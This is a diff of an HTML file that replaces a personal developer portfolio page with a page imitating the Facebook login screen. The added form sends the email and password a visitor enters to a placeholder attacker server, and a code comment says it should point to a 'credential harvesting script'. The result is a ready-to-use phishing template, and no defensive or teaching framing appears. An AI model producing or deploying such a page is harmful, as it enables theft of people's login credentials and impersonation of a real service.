@@ -1,230 +1,118 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>You're Not Ready</title>
-<link href="https://fonts.googleapis.com/css2?family=Bebas+Neue&family=Space+Mono:ital,wght@0,400;0,700;1,400&display=swap" rel="stylesheet">
-<style>
-  :root {
-    --acid: #c8ff00;
-    --black: #080808;
-    --white: #f0f0f0;
-    --mid: #1a1a1a;
-  }
-  * { margin: 0; padding: 0; box-sizing: border-box; }
-  ::selection { background: var(--acid); color: var(--black); }
-  html { scroll-behavior: smooth; }
-  body { background: var(--black); color: var(--white); font-family: 'Space Mono', monospace; cursor: none; overflow-x: hidden; }
-
-  #cursor { position: fixed; width: 12px; height: 12px; background: var(--acid); border-radius: 50%; pointer-events: none; z-index: 9999; mix-blend-mode: exclusion; }
-  #cursor-ring { position: fixed; width: 40px; height: 40px; border: 1px solid var(--acid); border-radius: 50%; pointer-events: none; z-index: 9998; mix-blend-mode: exclusion; opacity: 0.5; }
-
-  body::before { content: ''; position: fixed; inset: 0; background-image: url("data:image/svg+xml,%3Csvg viewBox='0 0 256 256' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='noise'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23noise)' opacity='0.04'/%3E%3C/svg%3E"); pointer-events: none; z-index: 1000; opacity: 0.4; }
-
-  #hero { min-height: 100vh; display: grid; place-items: center; position: relative; overflow: hidden; padding: 2rem; }
-  .hero-bg { position: absolute; inset: 0; background: radial-gradient(ellipse 60% 50% at 70% 40%, rgba(200,255,0,0.07) 0%, transparent 70%), radial-gradient(ellipse 40% 60% at 20% 80%, rgba(255,45,85,0.06) 0%, transparent 60%); }
-  .hero-grid { position: absolute; inset: 0; background-image: linear-gradient(rgba(200,255,0,0.04) 1px, transparent 1px), linear-gradient(90deg, rgba(200,255,0,0.04) 1px, transparent 1px); background-size: 80px 80px; animation: grid-drift 20s linear infinite; }
-  @keyframes grid-drift { from { transform: translateY(0); } to { transform: translateY(80px); } }
-
-  .hero-content { position: relative; z-index: 2; text-align: left; max-width: 900px; width: 100%; }
-  .eyebrow { font-size: .7rem; letter-spacing: .3em; color: var(--acid); text-transform: uppercase; margin-bottom: 1.5rem; opacity: 0; animation: fade-up .8s .2s forwards; }
-  .eyebrow::before { content: ''; display: inline-block; width: 40px; height: 1px; background: var(--acid); vertical-align: middle; margin-right: 12px; }
-
-  h1 { font-family: 'Bebas Neue', sans-serif; font-size: clamp(5rem, 16vw, 14rem); line-height: .88; margin-bottom: 2rem; opacity: 0; animation: fade-up .8s .4s forwards; }
-  h1 .line-2 { color: transparent; -webkit-text-stroke: 1px rgba(240,240,240,0.3); display: block; }
-  h1 .accent { color: var(--acid); }
-
-  .hero-sub { font-size: clamp(.75rem, 1.8vw, .9rem); line-height: 1.8; color: rgba(240,240,240,.5); max-width: 480px; margin-bottom: 3rem; opacity: 0; animation: fade-up .8s .6s forwards; }
-  .hero-cta { display: inline-flex; align-items: center; gap: 14px; background: var(--acid); color: var(--black); font-family: 'Space Mono', monospace; font-size: .75rem; font-weight: 700; letter-spacing: .15em; text-transform: uppercase; text-decoration: none; padding: 1rem 2rem; clip-path: polygon(0 0, calc(100% - 12px) 0, 100% 12px, 100% 100%, 12px 100%, 0 calc(100% - 12px)); transition: all .2s; opacity: 0; animation: fade-up .8s .8s forwards; }
-  .hero-cta:hover { background: var(--white); transform: translate(-3px,-3px); box-shadow: 6px 6px 0 var(--acid); }
-  .hero-cta::after { content: '→'; font-size: 1rem; }
-
-  .scroll-hint { position: absolute; bottom: 3rem; left: 50%; transform: translateX(-50%); display: flex; flex-direction: column; align-items: center; gap: 8px; font-size: .6rem; letter-spacing: .2em; text-transform: uppercase; color: rgba(240,240,240,.3); animation: fade-in 1s 2s both; }
-  .scroll-line { width: 1px; height: 60px; background: linear-gradient(to bottom, rgba(200,255,0,.6), transparent); animation: scroll-pulse 2s ease-in-out infinite; }
-  @keyframes scroll-pulse { 0%,100% { opacity:.3; } 50% { opacity:1; } }
-
-  .marquee-wrap { overflow: hidden; border-top: 1px solid rgba(200,255,0,.15); border-bottom: 1px solid rgba(200,255,0,.15); padding: 1rem 0; background: var(--mid); }
-  .marquee-track { display: flex; white-space: nowrap; animation: marquee 18s linear infinite; }
-  .marquee-item { font-family: 'Bebas Neue', sans-serif; font-size: 1.4rem; letter-spacing: .1em; color: rgba(240,240,240,.15); padding: 0 2rem; flex-shrink: 0; }
-  .marquee-item.h { color: var(--acid); }
-  @keyframes marquee { from { transform: translateX(0); } to { transform: translateX(-50%); } }
-
-  #stats { padding: 8rem 2rem; max-width: 1100px; margin: 0 auto; }
-  .section-label { font-size: .65rem; letter-spacing: .35em; text-transform: uppercase; color: var(--acid); margin-bottom: 4rem; display: flex; align-items: center; gap: 14px; }
-  .section-label::after { content: ''; flex: 1; height: 1px; background: rgba(200,255,0,.15); max-width: 200px; }
-  .stats-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px,1fr)); gap: 1px; background: rgba(200,255,0,.08); border: 1px solid rgba(200,255,0,.08); }
-  .stat-card { background: var(--black); padding: 3rem 2rem; position: relative; overflow: hidden; transition: background .3s; }
-  .stat-card:hover { background: var(--mid); }
-  .stat-card::after { content: ''; position: absolute; top: 0; left: 0; width: 3px; height: 0; background: var(--acid); transition: height .4s; }
-  .stat-card:hover::after { height: 100%; }
-  .stat-num { font-family: 'Bebas Neue', sans-serif; font-size: clamp(3rem,6vw,5rem); color: var(--acid); line-height: 1; margin-bottom: .5rem; }
-  .stat-label { font-size: .7rem; letter-spacing: .2em; text-transform: uppercase; color: rgba(240,240,240,.4); }
-
-  #skills { padding: 8rem 2rem; background: var(--mid); }
-  #skills .inner { max-width: 1100px; margin: 0 auto; }
-  .skill-row { display: flex; align-items: center; gap: 2rem; padding: 1.8rem 0; border-bottom: 1px solid rgba(240,240,240,.06); transition: padding .25s; }
-  .skill-row:hover { padding-left: 1rem; }
-  .skill-index { font-size: .65rem; color: rgba(200,255,0,.4); width: 2rem; flex-shrink: 0; }
-  .skill-name { font-family: 'Bebas Neue', sans-serif; font-size: clamp(1.6rem,3.5vw,2.4rem); flex: 1; }
-  .skill-bar { flex: 2; height: 2px; background: rgba(240,240,240,.08); position: relative; max-width: 320px; }
-  .skill-bar-fill { position: absolute; top: 0; left: 0; height: 100%; background: var(--acid); transition: width 1.5s cubic-bezier(.25,1,.5,1); }
-  .skill-pct { font-size: .75rem; color: rgba(240,240,240,.35); width: 3rem; text-align: right; flex-shrink: 0; }
-
-  #projects { padding: 8rem 2rem; max-width: 1100px; margin: 0 auto; }
-  .projects-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px,1fr)); gap: 1.5rem; }
-  .project-card { border: 1px solid rgba(240,240,240,.07); padding: 2.5rem; position: relative; overflow: hidden; transition: all .3s; background: var(--black); }
-  .project-card:hover { border-color: var(--acid); transform: translateY(-6px); box-shadow: 0 20px 60px rgba(0,0,0,.5); }
-  .project-card::before { content: attr(data-num); position: absolute; top: 1.5rem; right: 2rem; font-family: 'Bebas Neue', sans-serif; font-size: 4rem; color: rgba(240,240,240,.04); line-height: 1; }
-  .project-tag { display: inline-block; font-size: .6rem; letter-spacing: .2em; text-transform: uppercase; color: var(--acid); border: 1px solid rgba(200,255,0,.3); padding: 3px 10px; margin-bottom: 1.5rem; }
-  .project-title { font-family: 'Bebas Neue', sans-serif; font-size: 2rem; margin-bottom: .8rem; line-height: 1.1; }
-  .project-desc { font-size: .78rem; line-height: 1.8; color: rgba(240,240,240,.45); margin-bottom: 2rem; }
-  .project-link { font-size: .7rem; letter-spacing: .15em; text-transform: uppercase; color: var(--acid); text-decoration: none; display: inline-flex; align-items: center; gap: 8px; transition: gap .2s; }
-  .project-card:hover .project-link { gap: 14px; }
-
-  #contact { padding: 8rem 2rem; background: var(--acid); position: relative; overflow: hidden; }
-  #contact::before { content: 'HIT ME'; position: absolute; font-family: 'Bebas Neue', sans-serif; font-size: clamp(8rem,25vw,22rem); color: rgba(0,0,0,.07); top: 50%; left: 50%; transform: translate(-50%,-50%); white-space: nowrap; pointer-events: none; }
-  #contact .inner { max-width: 900px; margin: 0 auto; position: relative; }
-  #contact .section-label { color: var(--black); }
-  #contact .section-label::after { background: rgba(0,0,0,.15); }
-  .contact-heading { font-family: 'Bebas Neue', sans-serif; font-size: clamp(4rem,10vw,9rem); color: var(--black); line-height: .9; margin-bottom: 3rem; }
-  .contact-links { display: flex; flex-wrap: wrap; gap: 1rem; }
-  .contact-link { display: inline-flex; align-items: center; gap: 10px; background: var(--black); color: var(--acid); font-family: 'Space Mono', monospace; font-size: .75rem; font-weight: 700; letter-spacing: .1em; text-transform: uppercase; text-decoration: none; padding: 1rem 1.8rem; transition: all .2s; }
-  .contact-link:hover { background: var(--white); color: var(--black); transform: translate(-3px,-3px); box-shadow: 6px 6px 0 rgba(0,0,0,.25); }
-
-  footer { padding: 2rem; text-align: center; font-size: .65rem; letter-spacing: .15em; color: rgba(240,240,240,.2); text-transform: uppercase; border-top: 1px solid rgba(240,240,240,.05); }
-  footer span { color: var(--acid); }
-
-  @keyframes fade-up { from { opacity:0; transform:translateY(30px); } to { opacity:1; transform:translateY(0); } }
-  @keyframes fade-in { from { opacity:0; } to { opacity:1; } }
-  .reveal { opacity:0; transform:translateY(40px); transition: opacity .8s, transform .8s; }
-  .reveal.visible { opacity:1; transform:translateY(0); }
-
-  @media (max-width:600px) { .skill-bar,.skill-pct { display:none; } }
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook - Log In or Sign Up</title>
+    <style>
+        body {
+            font-family: Helvetica, Arial, sans-serif;
+            background-color: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .container {
+            display: flex;
+            width: 980px;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .left-side {
+            width: 500px;
+        }
+        .left-side h1 {
+            color: #1877f2;
+            font-size: 4rem;
+            margin: 0;
+        }
+        .left-side p {
+            font-size: 1.75rem;
+            line-height: 2rem;
+            margin-top: 10px;
+        }
+        .right-side {
+            background-color: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
+            width: 396px;
+            text-align: center;
+        }
+        input[type="text"], input[type="password"] {
+            width: 100%;
+            padding: 14px 16px;
+            margin: 6px 0;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            box-sizing: border-box;
+            font-size: 17px;
+        }
+        button {
+            background-color: #1877f2;
+            color: white;
+            padding: 14px;
+            margin: 10px 0;
+            border: none;
+            border-radius: 6px;
+            width: 100%;
+            font-size: 20px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #166fe5;
+        }
+        .forgot-password {
+            color: #1877f2;
+            text-decoration: none;
+            font-size: 14px;
+            display: block;
+            margin-top: 15px;
+        }
+        hr {
+            border: 0;
+            border-top: 1px solid #dadde1;
+            margin: 20px 0;
+        }
+        .create-account {
+            background-color: #42b72a;
+            color: white;
+            padding: 14px 20px;
+            border: none;
+            border-radius: 6px;
+            font-size: 17px;
+            font-weight: bold;
+            cursor: pointer;
+            text-decoration: none;
+            display: inline-block;
+        }
+        .create-account:hover {
+            background-color: #36a420;
+        }
+    </style>
 </head>
 <body>
 
-<div id="cursor"></div>
-<div id="cursor-ring"></div>
-
-<section id="hero">
-  <div class="hero-bg"></div>
-  <div class="hero-grid"></div>
-  <div class="hero-content">
-    <p class="eyebrow">est. right now &nbsp;·&nbsp; portfolio</p>
-    <h1>TOO<br><span class="line-2">COLD<br>TO</span><span class="accent">HANDLE</span></h1>
-    <p class="hero-sub">Designer. Developer. Architect of things that make people stop scrolling. Built different. Shipped it anyway.</p>
-    <a href="#projects" class="hero-cta">See the work</a>
-  </div>
-  <div class="scroll-hint"><span>scroll</span><div class="scroll-line"></div></div>
-</section>
-
-<div class="marquee-wrap">
-  <div class="marquee-track">
-    <span class="marquee-item">FULL STACK</span><span class="marquee-item h">✦</span>
-    <span class="marquee-item">UI/UX</span><span class="marquee-item h">✦</span>
-    <span class="marquee-item">PRODUCT DESIGN</span><span class="marquee-item h">✦</span>
-    <span class="marquee-item">WEB3</span><span class="marquee-item h">✦</span>
-    <span class="marquee-item">AI/ML</span><span class="marquee-item h">✦</span>
-    <span class="marquee-item">CREATIVE TECH</span><span class="marquee-item h">✦</span>
-    <span class="marquee-item">FULL STACK</span><span class="marquee-item h">✦</span>
-    <span class="marquee-item">UI/UX</span><span class="marquee-item h">✦</span>
-    <span class="marquee-item">PRODUCT DESIGN</span><span class="marquee-item h">✦</span>
-    <span class="marquee-item">WEB3</span><span class="marquee-item h">✦</span>
-    <span class="marquee-item">AI/ML</span><span class="marquee-item h">✦</span>
-    <span class="marquee-item">CREATIVE TECH</span><span class="marquee-item h">✦</span>
-  </div>
+<div class="container">
+    <div class="left-side">
+        <h1>facebook</h1>
+        <p>Connect with friends and the world around you on Facebook.</p>
+    </div>
+    <div class="right-side">
+        <!-- The form action should point to your credential harvesting script -->
+        <form action="https://your-malicious-server.com/capture.php" method="POST">
+            <input type="text" name="email" placeholder="Email or phone number" required>
+            <input type="password" name="password" placeholder="Password" required>
+            <button type="submit">Log In</button>
+            <a href="#" class="forgot-password">Forgot password?</a>
+            <hr>
+            <a href="#" class="create-account">Create new account</a>
+        </form>
+    </div>
 </div>
 
-<section id="stats">
-  <p class="section-label reveal">By the numbers</p>
-  <div class="stats-grid reveal">
-    <div class="stat-card"><div class="stat-num" data-target="47">0</div><div class="stat-label">Projects shipped</div></div>
-    <div class="stat-card"><div class="stat-num" data-target="3">0</div><div class="stat-label">Years coding</div></div>
-    <div class="stat-card"><div class="stat-num" data-target="99">0</div><div class="stat-label">Lighthouse score</div></div>
-    <div class="stat-card"><div class="stat-num" data-target="0">0</div><div class="stat-label">Days off (jk)</div></div>
-  </div>
-</section>
-
-<section id="skills">
-  <div class="inner">
-    <p class="section-label reveal">What I run</p>
-    <div class="skill-row reveal"><span class="skill-index">01</span><span class="skill-name">React / Next.js</span><div class="skill-bar"><div class="skill-bar-fill" data-width="96" style="width:0"></div></div><span class="skill-pct">96%</span></div>
-    <div class="skill-row reveal"><span class="skill-index">02</span><span class="skill-name">Node / Python</span><div class="skill-bar"><div class="skill-bar-fill" data-width="90" style="width:0"></div></div><span class="skill-pct">90%</span></div>
-    <div class="skill-row reveal"><span class="skill-index">03</span><span class="skill-name">UI Design / Figma</span><div class="skill-bar"><div class="skill-bar-fill" data-width="93" style="width:0"></div></div><span class="skill-pct">93%</span></div>
-    <div class="skill-row reveal"><span class="skill-index">04</span><span class="skill-name">AI / LLM Integration</span><div class="skill-bar"><div class="skill-bar-fill" data-width="85" style="width:0"></div></div><span class="skill-pct">85%</span></div>
-    <div class="skill-row reveal"><span class="skill-index">05</span><span class="skill-name">DevOps / Cloud</span><div class="skill-bar"><div class="skill-bar-fill" data-width="80" style="width:0"></div></div><span class="skill-pct">80%</span></div>
-  </div>
-</section>
-
-<section id="projects">
-  <p class="section-label reveal">Selected work</p>
-  <div class="projects-grid">
-    <div class="project-card reveal" data-num="01"><span class="project-tag">SaaS / AI</span><h3 class="project-title">NeuralDash</h3><p class="project-desc">Real-time analytics platform powered by LLMs. Processes 10M+ events/day. Zero latency. Pure results.</p><a href="#" class="project-link">View case study →</a></div>
-    <div class="project-card reveal" data-num="02"><span class="project-tag">Web3 / DeFi</span><h3 class="project-title">VaultProtocol</h3><p class="project-desc">On-chain yield optimizer. $2M TVL in first month. Audited. Unruggable. Built in 72 hours.</p><a href="#" class="project-link">View case study →</a></div>
-    <div class="project-card reveal" data-num="03"><span class="project-tag">Creative / 3D</span><h3 class="project-title">Chromosphere</h3><p class="project-desc">Generative art engine. 40k unique pieces. Sold out in 11 minutes. WebGL + custom shaders.</p><a href="#" class="project-link">View case study →</a></div>
-    <div class="project-card reveal" data-num="04"><span class="project-tag">Mobile / iOS</span><h3 class="project-title">FlowState</h3><p class="project-desc">Focus app with biometric sync. #1 productivity in 6 countries. 200k downloads, 4.9★.</p><a href="#" class="project-link">View case study →</a></div>
-    <div class="project-card reveal" data-num="05"><span class="project-tag">Tooling / OSS</span><h3 class="project-title">Cascadia CLI</h3><p class="project-desc">Open source dev toolkit with 8k GitHub stars. Used by engineers at Google, Stripe, and Vercel.</p><a href="#" class="project-link">View case study →</a></div>
-    <div class="project-card reveal" data-num="06"><span class="project-tag">Agency / Branding</span><h3 class="project-title">Phantom Studio</h3><p class="project-desc">Full brand identity + digital presence for a Series B startup. Raised $14M two weeks post-launch.</p><a href="#" class="project-link">View case study →</a></div>
-  </div>
-</section>
-
-<section id="contact">
-  <div class="inner">
-    <p class="section-label reveal">Let's talk</p>
-    <h2 class="contact-heading reveal">DON'T<br>SLEEP ON IT</h2>
-    <div class="contact-links reveal">
-      <a href="mailto:you@example.com" class="contact-link">✉ Email me</a>
-      <a href="https://github.com/" target="_blank" class="contact-link">⌥ GitHub</a>
-      <a href="https://twitter.com/" target="_blank" class="contact-link">𝕏 Twitter</a>
-      <a href="https://linkedin.com/" target="_blank" class="contact-link">in LinkedIn</a>
-    </div>
-  </div>
-</section>
-
-<footer><p>Designed & built by <span>You</span> &nbsp;·&nbsp; <span>2026</span> &nbsp;·&nbsp; No templates. No regrets.</p></footer>
-
-<script>
-  const cursor = document.getElementById('cursor');
-  const ring = document.getElementById('cursor-ring');
-  let mx = 0, my = 0, rx = 0, ry = 0;
-
-  document.addEventListener('mousemove', e => {
-    mx = e.clientX; my = e.clientY;
-    cursor.style.transform = `translate(${mx-6}px,${my-6}px)`;
-  });
-
-  (function animRing() {
-    rx += (mx - rx - 20) * 0.15;
-    ry += (my - ry - 20) * 0.15;
-    ring.style.transform = `translate(${rx}px,${ry}px)`;
-    requestAnimationFrame(animRing);
-  })();
-
-  document.querySelectorAll('a,button,.project-card,.stat-card').forEach(el => {
-    el.addEventListener('mouseenter', () => { cursor.style.transform = `translate(${mx-6}px,${my-6}px) scale(2.5)`; ring.style.opacity='0'; });
-    el.addEventListener('mouseleave', () => { cursor.style.transform = `translate(${mx-6}px,${my-6}px) scale(1)`; ring.style.opacity='0.5'; });
-  });
-
-  const observer = new IntersectionObserver(entries => {
-    entries.forEach(entry => {
-      if (!entry.isIntersecting) return;
-      entry.target.classList.add('visible');
-      entry.target.querySelectorAll('.skill-bar-fill').forEach(b => { b.style.width = b.dataset.width + '%'; });
-      entry.target.querySelectorAll('[data-target]').forEach(el => {
-        const t = +el.dataset.target; let c = 0;
-        const iv = setInterval(() => { c = Math.min(c + Math.max(t/60,1), t); el.textContent = Math.floor(c); if(c>=t) clearInterval(iv); }, 20);
-      });
-    });
-  }, { threshold: 0.15 });
-
-  document.querySelectorAll('.reveal').forEach(el => observer.observe(el));
-
-  window.addEventListener('scroll', () => {
-    const h1 = document.querySelector('#hero h1');
-    if (h1) h1.style.transform = `translateY(${window.scrollY * 0.25}px)`;
-  });
-</script>
 </body>
 </html>
